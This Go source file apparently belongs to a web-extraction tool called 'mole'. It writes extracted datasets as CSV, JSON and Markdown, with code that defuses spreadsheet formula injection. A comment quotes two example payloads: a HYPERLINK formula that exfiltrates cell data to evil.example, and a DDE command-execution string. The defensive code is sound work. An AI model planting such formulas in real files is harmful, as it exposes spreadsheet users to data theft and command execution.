package dataset

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"sort"
	"strconv"
	"strings"
)

// Rendering, in two formats that are deliberately not equivalent.
//
// JSON is the complete form: every cell, every alternative a source disagreed
// about, every source and every quote. CSV is one value per cell because that is
// what a CSV is, so it is LOSSY — and rather than pretend otherwise it carries
// the columns that say so, and the doc comment says which format to use when the
// answer matters.
//
// A format that quietly dropped the disagreements would be the most convenient
// output and the least honest one.

// WriteCSV renders the dataset as CSV.
//
// Lossy on purpose, and it says so with columns rather than with prose, because
// a CSV has nowhere to put prose: a `sources` count and a `contested` column
// naming the fields the sources disagreed about. The JSON form is the one to use
// when a disagreement matters.
func (d Dataset) WriteCSV(w io.Writer, provenance bool) error {
	cw := csv.NewWriter(w)

	header := append([]string{}, d.Schema.Names()...)
	header = append(header, ReservedColumns[:2]...)
	if provenance {
		header = append(header, ReservedColumns[2:]...)
	}
	if err := cw.Write(header); err != nil {
		return err
	}

	for _, row := range d.Rows {
		rec := make([]string, 0, len(header))
		for _, name := range d.Schema.Names() {
			rec = append(rec, cleanCell(row.Get(name)))
		}
		rec = append(rec,
			fmt.Sprint(len(row.Sources)),
			strings.Join(row.ContestedFields(), " "))
		if provenance {
			rec = append(rec,
				cleanCell(strings.Join(row.Sources, " ")),
				cleanCell(row.SupportingQuote()),
				cleanCell(row.Disagreements()))
		}
		if err := cw.Write(rec); err != nil {
			return err
		}
	}
	cw.Flush()
	return cw.Error()
}

// ReservedColumns are the names WriteCSV appends after the schema's own.
//
// Schema.Validate refuses a field with one of these names. It did not, and
// `--schema 'company:text!,sources:text,quote:text'` produced a header with two
// columns called `sources` and two called `quote` — any reader keyed by name
// silently takes one of them, which is a misparse rather than an error.
// The first two are always written; the rest are added by --provenance.
var ReservedColumns = [...]string{"sources", "contested", "source_urls", "quote", "disagreements"}

// cleanCell removes what a spreadsheet would misread and defuses what it would
// EXECUTE.
//
// Newlines and tabs inside a quoted CSV field are legal, carry no meaning in an
// extracted value, and are misread by enough tools to make a dataset look
// corrupted.
//
// The second half is security. Excel, LibreOffice and Sheets evaluate a cell
// starting =, +, - or @, so a page containing
//
//	=HYPERLINK("http://evil.example?x="&A1,"click")
//
// becomes an exfiltration link when the file is opened, and =cmd|' /C calc'!A0
// is the DDE variant. mole extracts from arbitrary web pages into a file people
// open in spreadsheets, which is that threat model exactly.
//
// A leading apostrophe is the standard mitigation: spreadsheets read the rest as
// text, a CSV parser sees one harmless character. Escaping would change the
// value; refusing the row would lose data over a rendering concern.
func cleanCell(s string) string {
	return defuseFormula(strings.Join(strings.Fields(s), " "))
}

// formulaLeaders are the characters a spreadsheet reads as "evaluate this".
//
// Tab and carriage return belong on this list in principle and are not on it:
// cleanCell has already replaced both, three lines above every call.
const formulaLeaders = "=+-@"

// defuseFormula prefixes an apostrophe to a value a spreadsheet would evaluate.
//
// A NUMBER is never defused, and the first version of this did defuse them —
// `-` is both a formula leader and a minus sign, so every loss, decline and
// negative delta in a dataset became `'-1200000`, which a spreadsheet reads as
// text: no sum, no sort, no chart. coerceNumber produces exactly that string for
// a bracketed loss, so it was the common case rather than a corner.
//
// Parsing the value is the test rather than special-casing the type, because a
// text column can legitimately hold a negative number and the rendering does not
// know which column it is in.
func defuseFormula(s string) string {
	if s == "" || !strings.ContainsRune(formulaLeaders, rune(s[0])) {
		return s
	}
	if _, err := strconv.ParseFloat(s, 64); err == nil {
		return s
	}
	return "'" + s
}

// WriteJSON renders the complete form.
func (d Dataset) WriteJSON(w io.Writer) error {
	enc := json.NewEncoder(w)
	enc.SetIndent("", "  ")
	return enc.Encode(d)
}

// Summary is the human-readable account of what came out, for the CLI and for
// the session's stored report.
//
// It leads with the numbers that qualify the dataset rather than the size of it.
// "40 rows" invites more confidence than "40 rows, 31 from a single source, 6
// with sources that disagree" — and the second is the same result described
// honestly.
func (d Dataset) Summary() string {
	var b strings.Builder
	fmt.Fprintf(&b, "%d row(s) from %d extraction(s)", len(d.Rows), d.Extracted)
	if c := d.Corroborated(); c > 0 {
		fmt.Fprintf(&b, "; %d corroborated by more than one source", c)
	}
	if single := len(d.Rows) - d.Corroborated(); single > 0 {
		fmt.Fprintf(&b, "; %d from a single source", single)
	}
	if c := d.Contested(); c > 0 {
		fmt.Fprintf(&b, "; %d with sources that disagree", c)
	}
	if v := d.WithVariants(); v > 0 {
		// Reported because it is the merge showing its work. A row assembled from
		// "Acme Ltd" and "Acme Limited" was a JUDGEMENT, and a summary that
		// mentioned only the disagreements would hide every decision the merge
		// made on its own — which are the ones a reader would want to spot-check.
		fmt.Fprintf(&b, "; %d merged sources that named the entity differently", v)
	}
	b.WriteString(".")

	if fields := d.contestedFieldCounts(); len(fields) > 0 {
		b.WriteString("\n\nFields the sources disagree about:\n")
		for _, fc := range fields {
			fmt.Fprintf(&b, "  %s — %d row(s)\n", fc.name, fc.n)
		}
		b.WriteString("Every disagreeing value is kept; the JSON output carries all of them.\n")
	}
	for _, n := range d.Notes {
		b.WriteString("\n- " + n)
	}
	return b.String()
}

type fieldCount struct {
	name string
	n    int
}

func (d Dataset) contestedFieldCounts() []fieldCount {
	counts := map[string]int{}
	for _, r := range d.Rows {
		for _, f := range r.ContestedFields() {
			counts[f]++
		}
	}
	out := make([]fieldCount, 0, len(counts))
	for name, n := range counts {
		out = append(out, fieldCount{name, n})
	}
	sort.Slice(out, func(i, j int) bool {
		if out[i].n != out[j].n {
			return out[i].n > out[j].n
		}
		return out[i].name < out[j].name
	})
	return out
}

// Markdown renders the dataset for the session's stored report.
//
// A table, capped, plus the summary. Not the whole dataset: a stored report is
// read in a terminal and a thousand-row markdown table is not readable there —
// `mole dataset` writes the complete file. The cap is stated in the output rather
// than left for somebody to notice a missing row.
func Markdown(d Dataset) string {
	var b strings.Builder
	b.WriteString("## Dataset\n\n")
	b.WriteString(d.Summary())
	b.WriteString("\n\n")

	if len(d.Rows) == 0 {
		b.WriteString("_No row survived extraction._\n")
		return b.String()
	}

	names := d.Schema.Names()
	b.WriteString("| " + strings.Join(names, " | ") + " | sources |\n")
	b.WriteString("|" + strings.Repeat("---|", len(names)+1) + "\n")

	shown := d.Rows
	if len(shown) > MarkdownRows {
		shown = shown[:MarkdownRows]
	}
	for _, row := range shown {
		cells := make([]string, 0, len(names)+1)
		for _, n := range names {
			v := cleanCell(row.Get(n))
			if row.Cells[n].Contested() {
				// Marked in the table, because a reader scanning a markdown
				// summary will not open the JSON to find out which figures the
				// sources could not agree on.
				v += " ⚠"
			}
			cells = append(cells, escapePipes(v))
		}
		cells = append(cells, fmt.Sprint(len(row.Sources)))
		b.WriteString("| " + strings.Join(cells, " | ") + " |\n")
	}
	if len(d.Rows) > len(shown) {
		fmt.Fprintf(&b, "\n_%d of %d rows shown; `mole dataset <session>` writes them all._\n",
			len(shown), len(d.Rows))
	}
	if d.Contested() > 0 {
		b.WriteString("\n⚠ marks a value the sources disagree about. Every value is kept; " +
			"the JSON output carries all of them, each with the sources that gave it.\n")
	}
	return b.String()
}

// MarkdownRows caps the table in a stored report.
const MarkdownRows = 50

// escapePipes keeps a value from breaking the table it sits in.
func escapePipes(s string) string { return strings.ReplaceAll(s, "|", "\\|") }
